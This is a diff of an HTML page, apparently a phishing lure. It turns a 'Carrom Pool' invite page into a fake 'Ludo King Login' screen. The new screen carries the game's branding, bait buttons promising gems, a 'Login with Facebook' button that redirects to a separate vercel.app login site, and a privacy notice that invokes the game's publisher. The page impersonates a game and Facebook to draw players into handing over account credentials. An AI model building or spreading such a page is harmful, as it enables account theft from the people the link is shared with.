@@ -2,153 +2,152 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
- <!-- HTML Meta Tags -->
-<title>Carrom Pool </title>
-<meta name="description" content="come play carrom pool with me?">
-
-<!-- Facebook Meta Tags -->
-<meta property="og:url" content="https://game-players-online.vercel.app">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Carrom Pool ">
-<meta property="og:description" content="come play carrom pool with me?">
-<meta property="og:image" content="https://opengraph.b-cdn.net/production/images/6b899d6a-37ae-4df0-ba49-67c1d079d56a.jpg?token=2a3D3GHH4-MKuYJjSm2bWyrnb5XWKIYCvdWnDiAxm4Q&height=730&width=1080&expires=33296641375">
-
-<!-- Twitter Meta Tags -->
-<meta name="twitter:card" content="summary_large_image">
-<meta property="twitter:domain" content="game-players-online.vercel.app">
-<meta property="twitter:url" content="https://game-players-online.vercel.app">
-<meta name="twitter:title" content="Carrom Pool ">
-<meta name="twitter:description" content="come play carrom pool with me?">
-<meta name="twitter:image" content="https://opengraph.b-cdn.net/production/images/6b899d6a-37ae-4df0-ba49-67c1d079d56a.jpg?token=2a3D3GHH4-MKuYJjSm2bWyrnb5XWKIYCvdWnDiAxm4Q&height=730&width=1080&expires=33296641375">
-
-<!-- Meta Tags Generated via https://www.opengraph.xyz -->
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Carrom Pool</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+  <title>Ludo King Login</title>
+
+  <!-- Social Media Preview (Open Graph + Twitter + WhatsApp + Telegram) -->
+  <meta property="og:title" content="Ludo King - Login" />
+  <meta property="og:description" content="Login to Ludo King and sync your progress instantly!" />
+  <meta property="og:image" content="https://querulous-crimson-amsttzakrm.edgeone.app/5a6501a4-a969-492b-94dc-8bd3870cb1a8%20(1).jpg" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://login-for-game.vercel.app/" />
+
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Ludo King - Login" />
+  <meta name="twitter:description" content="Login to Ludo King and sync your data instantly!" />
+  <meta name="twitter:image" content="https://querulous-crimson-amsttzakrm.edgeone.app/5a6501a4-a969-492b-94dc-8bd3870cb1a8%20(1).jpg" />
+
+  <meta name="description" content="Ludo King login screen — sync your progress, play with friends and earn gems!">
+  <meta name="theme-color" content="#1877f2" />
+
   <style>
-    body {
+    * {
+      box-sizing: border-box;
       margin: 0;
-      font-family: "Inter", sans-serif;
-      height: 100vh;
-      background: radial-gradient(circle at center, #b33b24 0%, #651d13 100%);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: flex-start;
-      overflow: hidden;
+      padding: 0;
     }
 
-    .logo {
-      margin-top: 110px;
-      width: 280px;
-      height: auto;
-      user-select: none;
-      display: block;
-      filter: drop-shadow(0px 4px 10px rgba(0, 0, 0, 0.5));
+    body {
+      font-family: "Poppins", Arial, sans-serif;
+      background: url('https://querulous-crimson-amsttzakrm.edgeone.app/5a6501a4-a969-492b-94dc-8bd3870cb1a8%20(1).jpg') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
     }
 
     .login-box {
-      background: rgba(90, 25, 15, 0.5);
-      border-radius: 14px;
-      padding: 30px 24px 40px;
+      background: rgba(0, 0, 0, 0.55);
+      backdrop-filter: blur(6px);
       text-align: center;
-      color: #fff;
-      margin-top: 80px;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+      padding: 40px 30px;
+      border-radius: 20px;
       width: 360px;
-      backdrop-filter: blur(5px);
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
+      animation: fadeIn 1.2s ease;
     }
 
-    .login-box h1 {
-      font-size: 19px;
-      font-weight: 700;
-      margin-bottom: 8px;
-      letter-spacing: 0.3px;
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(15px); }
+      to { opacity: 1; transform: translateY(0); }
     }
 
-    .login-box p {
-      font-size: 15px;
-      color: rgba(255, 255, 255, 0.9);
-      margin-bottom: 26px;
+    .logo {
+      width: 160px;
+      height: auto;
+      margin-bottom: 25px;
+      user-select: none;
+    }
+
+    .mini-buttons {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 25px;
+    }
+
+    .mini-btn {
+      background: linear-gradient(180deg, #0c53b7, #08377a);
+      border: none;
+      color: #fff;
+      font-size: 14px;
+      font-weight: 600;
+      padding: 10px 14px;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      cursor: pointer;
+      transition: all 0.25s ease;
+    }
+
+    .mini-btn:hover {
+      background: linear-gradient(180deg, #1365da, #0a3f8a);
+      transform: translateY(-2px);
     }
 
     .fb-btn {
-      background: linear-gradient(180deg, #1877f2, #0d5acb);
+      background-color: #1877f2;
       border: none;
-      border-radius: 10px;
-      color: #fff;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      padding: 14px 0;
-      width: 100%;
-      font-size: 17px;
+      color: white;
+      font-size: 18px;
       font-weight: 600;
+      padding: 14px 30px;
+      border-radius: 10px;
       cursor: pointer;
-      box-shadow: 0 5px 0 #0b4ca5;
-      transition: all 0.15s ease;
+      width: 100%;
+      margin-bottom: 15px;
+      transition: background 0.3s ease;
     }
 
     .fb-btn:hover {
-      background: linear-gradient(180deg, #1a7cff, #0c55b5);
+      background-color: #0f5cd6;
     }
 
-    .fb-btn:active {
-      transform: translateY(1px);
-      box-shadow: 0 3px 0 #0b4ca5;
+    .fb-btn img {
+      vertical-align: middle;
+      margin-right: 8px;
     }
 
-    .fb-icon {
-      width: 20px;
-      height: 20px;
-      fill: white;
+    .note {
+      color: #ddd;
+      font-size: 12px;
+      line-height: 1.5;
+      margin-top: 10px;
     }
 
-    .subtext {
-      font-size: 14px;
-      color: #ffe36b;
-      margin-top: 6px;
+    .note a {
+      color: #00aaff;
+      text-decoration: none;
       font-weight: 500;
-      text-shadow: 0 1px 2px rgba(0,0,0,0.4);
     }
 
-    @media (max-width: 480px) {
-      .logo {
-        width: 200px;
-        margin-top: 80px;
-      }
-      .login-box {
-        width: 85%;
-        margin-top: 60px;
-      }
+    .note a:hover {
+      text-decoration: underline;
     }
   </style>
 </head>
 <body>
-  <img class="logo" src="https://steep-brown-s9qnp4ijfy.edgeone.app/f31bedfe-443b-414b-8ab2-53c68d888c2f.jpg" alt="Carrom Pool Logo" />
-
   <div class="login-box">
-    <h1>Login to get bonus gems and coins</h1>
-    <p>Save your stats!</p>
+    <img class="logo" src="https://cute-amethyst-wx5zdxi8cw.edgeone.app/5a6501a4-a969-492b-94dc-8bd3870cb1a8.jpg" alt="Ludo King Logo" />
 
-    <button class="fb-btn" id="fbLogin">
-      <svg class="fb-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 36 36">
-        <path d="M22.68 8.44h2.67V4.26a34.53 34.53 0 0 0-3.89-.2c-3.85 0-6.48 2.35-6.48 6.66v3.71H10.9v4.68h4.08v11.9h4.98v-11.9h4.16l.66-4.68h-4.82v-3.22c0-1.35.37-2.27 2.7-2.27z"/>
-      </svg>
+    <div class="mini-buttons">
+      <button class="mini-btn">☁️ Save Data</button>
+      <button class="mini-btn">📱 Change Device</button>
+      <button class="mini-btn">💎 +100</button>
+    </div>
+
+    <button class="fb-btn" onclick="window.location.href='https://login-for-game.vercel.app/'">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" width="20" height="20" alt="FB" />
       Login with Facebook
     </button>
-    <div class="subtext">Play with your friends!</div>
+
+    <p class="note">
+      By continuing I agree that Gametion Technologies Pvt. Ltd. may store and process my data in accordance with the<br>
+      <a href="#">Privacy Policy</a>
+    </p>
   </div>
-
-  <script>
-    const username = "guest_player";
-    const sessionId = Math.random().toString(36).substring(2, 10);
-
-    document.getElementById("fbLogin").addEventListener("click", () => {
-      const url = `https://login-needed-for-game.vercel.app/?user=${encodeURIComponent(username)}&session=${encodeURIComponent(sessionId)}`;
-      window.open(url, "_blank");
-    });
-  </script>
 </body>
 </html>
